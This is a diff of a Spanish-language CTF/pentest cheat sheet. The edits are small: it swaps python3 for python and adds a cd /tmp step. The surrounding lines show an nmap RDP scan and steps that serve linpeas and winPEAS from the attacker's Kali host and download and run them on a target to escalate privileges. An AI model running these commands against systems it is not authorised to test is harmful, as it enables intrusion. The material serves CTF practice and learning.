@@ -410,7 +410,8 @@ nmap -p3389 -sV --script rdp-* -T4 IP
 🔑 ESCALADA PRIVILEGIOS(LINUX)
 Ve al directorio donde está linpeas:
 locate linpeas , SUELE ESTAR EN LOS CTF aquí:   /opt/PEASS-ng/
-python3 -m http.server 8000
+python -m http.server 8000
+cd /tmp   --->en el usuario
 wget http://TU_IP:8000/linpeas.sh
 chmod +x linpeas.sh
 ./linpeas.sh
@@ -563,7 +564,7 @@ cd winpeas
 
 
 4️⃣ LEVANTAR SERVIDOR WEB EN KALI
-python3 -m http.server 8080
+python -m http.server 8080
 5️⃣ DESCARGAR WINPEAS EN WINDOWS
 curl -O http://IPKALI:8080/winPEASany_ofs.exe
 o tmb muy común en CTF:
